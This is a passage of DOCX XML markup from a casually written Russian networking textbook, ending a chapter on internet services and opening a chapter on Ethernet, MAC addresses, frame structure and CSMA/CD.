      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение: Сервисы — это то, зачем мы в интернете</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WWW**: как работают сайты, браузеры, веб-серверы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Email**: протоколы почты (SMTP, POP3, IMAP), спам, фишинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Поисковики**: Google, Яндекс, SEO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Облака**: хранилища (Google Drive, Dropbox), IaaS/PaaS/SaaS (AWS, Heroku, Gmail)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Соцсети**: Facebook, Instagram, TikTok, алгоритмы ленты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мессенджеры**: WhatsApp, Telegram, E2E-шифрование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VoIP**: Zoom, Skype, кодеки, задержка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стриминг**: Netflix, YouTube, Spotify, адаптивный битрейт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Торренты**: P2P, BitTorrent</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Все эти сервисы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> построены на протоколах, которые мы разобрали в главе 8.04 (TCP, UDP, HTTP, DNS). Протоколы — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>фундамент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, а сервисы — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>здания</w:t>
      </w:r>
      <w:r>
        <w:t>, которые на нём стоят.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Без сервисов интернет — это просто кабели и роутеры. Сервисы делают интернет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>полезным</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для людей. Именно благодаря им мы можем гуглить котиков, стримить аниме, залипать в TikTok и заказывать пиццу через телегу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе разберём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сетевые протоколы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (углубимся в детали TCP/IP, Ethernet, ARP) — технические детали того, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> всё это работает на низком уровне.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">А пока — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>молодец, братан</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">! Ты разобрался во всех основных сервисах интернета. Теперь можешь рассказать друзьям, почему их Netflix лагает (спойлер: потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>15% всего интернет-трафика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> жрёт один только Netflix, и провайдер не справляется). 🎉🚀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.6. Сетевые протоколы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Под капотом интернета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, братишка, в прошлой главе мы разобрали высокоуровневые штуки — HTTP, TCP, UDP. Это всё круто, но как, бля, пакеты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>на самом деле</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> путешествуют от твоего ноутбука до сервера через свитчи, роутеры и всякие провода? Как компьютер узнаёт, куда физически отправить пакет, если у него есть только IP-адрес?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для этого существуют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сетевые протоколы нижнего уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это те, кто работают на канальном и сетевом уровнях, незаметно для пользователя, но без них вообще ничего бы не работало.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ethernet** — как данные передаются по проводам и Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ARP** — как IP-адреса превращаются в MAC-адреса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ICMP** — как работают `ping` и `traceroute`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DHCP** — как твой компьютер получает IP-адрес автоматически</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT** — как один публичный IP делится на всю домашнюю сеть</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IPv6** — будущее, которое никак не наступит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.01 (Адресация)** — IP-адреса, DNS, маски подсети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.02 (Сетевые компоненты)** — свитчи работают с MAC-адресами, роутеры — с IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — TCP/IP — это то, что едет внутри Ethernet-кадров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.07 (Модель OSI)** — Ethernet = уровень 2, IP = уровень 3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.1. Ethernet: король локальных сетей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ethernet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это самый популярный протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>канального уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Layer 2) для передачи данных в локальных сетях (LAN). Он работает с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC-адресами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и отвечает за доставку кадров (frames) между устройствами в одной сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История</w:t>
      </w:r>
      <w:r>
        <w:t>: Ethernet изобрели в 1973 году в Xerox PARC (Роберт Меткалф и его команда). Первая версия работала на скорости 2.94 Мбит/с по коаксиальному кабелю. Сейчас у нас есть 100-гигабитный Ethernet, и это ебать как быстро.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Стандарты Ethernet: от черепашьей скорости до космической</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ethernet эволюционировал за 50 лет, и теперь у нас куча стандартов с названиями типа `1000BASE-T`. Расшифровка:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Первое число** — скорость в Мбит/с (или Гбит/с)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BASE** — baseband (исходный сигнал, без модуляции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Последняя буква** — тип кабеля (T = витая пара, SX/LX = оптика)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные стандарты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Стандарт | Скорость | Кабель | Максимальная длина | Когда появился | Где используется |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|----------|--------|-------------------|----------------|------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10BASE-T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 10 Мбит/с | Витая пара Cat3 | 100 м | 1990 | Доисторические сети (умер) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100BASE-TX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Fast Ethernet) | 100 Мбит/с | Витая пара Cat5 | 100 м | 1995 | Старые офисы, встроенные системы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1000BASE-T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Gigabit Ethernet) | 1 Гбит/с | Витая пара Cat5e/Cat6 | 100 м | 1999 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стандарт для домов и офисов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10GBASE-T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (10 Gigabit Ethernet) | 10 Гбит/с | Витая пара Cat6a/Cat7 | 100 м | 2006 | Серверы, дата-центры |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>40GBASE-T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 40 Гбит/с | Витая пара Cat8 | 30 м | 2016 | Связь между серверами |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100GBASE-SR4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 100 Гбит/с | Оптоволокно | 100 м | 2010 | Магистральные каналы в ЦОД |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Дома у тебя роутер с портами </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Gigabit Ethernet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1 Гбит/с). Если скачиваешь файл с NAS по проводу, теоретическая скорость = 1000 Мбит/с = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>125 МБ/с</w:t>
      </w:r>
      <w:r>
        <w:t>. Но на практике будет ~110 МБ/с из-за накладных расходов (заголовки, задержки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MAC-адреса: физические имена устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC-адрес (Media Access Control address)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это уникальный 48-битный идентификатор сетевого адаптера (NIC). Его </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прошивают</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на заводе, и он (теоретически) не должен повторяться во всём мире.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат</w:t>
      </w:r>
      <w:r>
        <w:t>: 6 байт (12 шестнадцатеричных цифр), разделённых двоеточиями или дефисами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`00:1A:2B:3C:4D:5E`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`A4-5E-60-E7-12-93`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`08:00:27:AB:CD:EF` (VirtualBox)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура MAC-адреса</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Байты 1-3 (OUI) | Байты 4-6 (NIC) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------------|------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Organizationally Unique Identifier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (производитель) | Уникальный номер устройства |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OUI (Organizationally Unique Identifier)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это первые 3 байта, которые выдаёт IEEE производителям оборудования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры OUI</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`00:1A:2B` — Cisco</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`00:50:56` — VMware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`08:00:27` — VirtualBox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`A4:5E:60` — Apple</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как посмотреть свой MAC-адрес</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux/macOS**: `ip link` или `ifconfig`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows**: `ipconfig /all`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример вывода</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2: enp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500</w:t>
        <w:br/>
        <w:t xml:space="preserve">    link/ether 08:00:27:ab:cd:ef</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: MAC-адреса используются только внутри локальной сети (LAN). Роутер не пересылает MAC-адреса дальше — при выходе в интернет пакеты оборачиваются в новые Ethernet-кадры с новыми MAC-адресами на каждом участке пути.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура Ethernet-кадра: что внутри</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Ethernet передаёт данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кадрами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (frames). Кадр — это пакет данных с заголовками и трейлером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура Ethernet II (самый популярный формат)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поле | Размер | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|--------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преамбула</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Preamble) | 7 байт | Последовательность `10101010...` для синхронизации |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SFD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Start Frame Delimiter) | 1 байт | `10101011` — начало кадра |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC назначения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Destination MAC) | 6 байт | Куда отправляем |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC источника</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Source MAC) | 6 байт | Откуда отправляем |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тип</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (EtherType) | 2 байта | Протокол верхнего уровня (0x0800 = IPv4, 0x0806 = ARP, 0x86DD = IPv6) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Payload) | 46-1500 байт | IP-пакет или другие данные |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CRC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Frame Check Sequence) | 4 байта | Контрольная сумма для обнаружения ошибок |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минимальный размер кадра</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 64 байта (включая заголовки)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Максимальный размер кадра</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1518 байт (без VLAN-тегов)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MTU Ethernet</w:t>
      </w:r>
      <w:r>
        <w:t>: 1500 байт (только данные, без заголовков)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь HTTP-запрос с компьютера (MAC `AA:BB:CC:DD:EE:FF`) на роутер (MAC `11:22:33:44:55:66`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ethernet-кадр будет выглядеть так:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Преамбула 7 байт] [SFD 1 байт]</w:t>
        <w:br/>
        <w:t>[Destination MAC: 11:22:33:44:55:66]</w:t>
        <w:br/>
        <w:t>[Source MAC: AA:BB:CC:DD:EE:FF]</w:t>
        <w:br/>
        <w:t>[Type: 0x0800 (IPv4)]</w:t>
        <w:br/>
        <w:t>[IP-пакет с HTTP-запросом внутри]</w:t>
        <w:br/>
        <w:t>[CRC: 4 байта]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CRC (Cyclic Redundancy Check)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это контрольная сумма. Если кадр повреждён (например, помехи на линии), CRC не сойдётся, и кадр будет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отброшен</w:t>
      </w:r>
      <w:r>
        <w:t>. Повторную передачу обеспечивает TCP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CSMA/CD: как избегать коллизий (устарело, но знать надо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CSMA/CD (Carrier Sense Multiple Access with Collision Detection)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это механизм, который использовался в старых Ethernet-сетях с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хабами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (hubs).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Хаб — это тупое устройство, которое пересылает пакеты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Если два устройства отправляют данные одновременно, происходит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>коллизия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сигналы накладываются и искажаются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает CSMA/CD</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Carrier Sense** — перед отправкой устройство слушает линию: свободна ли она?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Multiple Access** — если свободна, отправляем кадр</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Collision Detection** — во время передачи слушаем: не происходит ли коллизия?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если коллизия обнаружена → останавливаемся, ждём **случайное время** (backoff), пытаемся снова</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему устарело</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Современные сети используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свитчи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (switches), которые создают отдельные каналы для каждого устройства (full-duplex). Коллизий больше нет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
